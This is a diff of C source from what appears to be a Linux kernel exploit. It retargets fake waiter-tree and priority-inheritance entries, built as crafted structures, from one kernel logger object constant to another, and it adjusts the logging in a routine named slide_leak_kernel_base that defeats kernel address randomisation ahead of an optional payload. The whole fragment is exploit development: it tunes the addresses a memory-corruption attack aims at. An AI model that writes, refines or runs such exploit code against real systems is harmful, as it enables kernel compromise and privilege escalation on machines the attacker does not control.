@@ -271,10 +271,10 @@ void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
     {5, slide_oracle_target, "pi_left"},
 #endif
 #else
-    {0, SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset, "tree_pc"},
+    {0, SLIDE_LOGGERS_0_1 + slide_p0_offset, "tree_pc"},
     {1, 0, "tree_right"},
     {2, SLIDE_WAITER_TREE_LEFT + slide_p0_offset, "tree_left"},
-    {3, SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset, "pi_pc"},
+    {3, SLIDE_LOGGERS_0_1 + slide_p0_offset, "pi_pc"},
     {4, 0, "pi_right"},
     {5, SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset, "pi_left"},
 #endif
@@ -310,11 +310,11 @@ void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
     {6, 0, "pi1"},
     {7, slide_oracle_target, "pi2"},
 #else
-    {0, SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset, "tree_pc"},
+    {0, SLIDE_LOGGERS_0_1 + slide_p0_offset, "tree_pc"},
     {1, 0, "tree_right"},
     {2, SLIDE_WAITER_TREE_LEFT + slide_p0_offset, "tree_left"},
     {3, FAKE_WAITER_PRIO, "tree_prio"},
-    {5, SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset, "pi0"},
+    {5, SLIDE_LOGGERS_0_1 + slide_p0_offset, "pi0"},
     {6, 0, "pi1"},
     {7, SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset, "pi2"},
 #endif
@@ -1885,7 +1885,7 @@ int slide_leak_kernel_base(void) {
     pr_info("slide attempt %d/%d p0_offset=%08zx logger_parent=%016llx "
             "bootid_target=%016llx\n",
             attempt, max_attempts, slide_p0_offset,
-            (unsigned long long)(SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset),
+            (unsigned long long)(SLIDE_LOGGERS_0_1 + slide_p0_offset),
             (unsigned long long)(
                 SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset));
 #if defined(APP_PAYLOAD) && APP_PAYLOAD && \
